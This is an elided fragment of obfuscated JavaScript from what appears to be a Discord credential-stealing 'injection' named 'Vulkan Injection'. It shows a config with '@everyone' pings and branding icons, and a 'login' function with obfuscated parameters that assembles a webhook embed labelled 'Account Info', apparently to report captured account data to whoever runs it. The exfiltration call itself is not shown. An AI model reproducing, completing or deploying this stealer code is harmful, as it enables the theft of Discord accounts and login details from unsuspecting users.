...
const config = {
  ...
  'ping_on_run': false,
  'ping_val': "@everyone",
  'embed_name': "Vulkan Injection",
  'embed_icon': "https://cdn.discordapp.com/attachments/1281618469582016565/1281917255495716934/image.png?ex=66dd75fa&is=66dc247a&hm=316239ae1556bdf8e357bec3adc95b7ab1e490f62768e4f3f9706059808a595b&",
...
const login = async (_0x94f435, _0x1dfaa7, _0x6db126) => {
  ...
  const _0x25ca5e = {
    'username': "Vulkan Injection",
    'avatar_url': "https://cdn.discordapp.com/attachments/1281618469582016565/1281641861957685363/image.png?ex=66dc757f&is=66db23ff&hm=48a7facf20d3ff153c3619c6dba20623dfc517dde844d1dc9d5a2fe02396dc82&",
    'embeds': [{
      'color': 0xFFA500,
      'fields': [{
        'name': "**Account Info**",
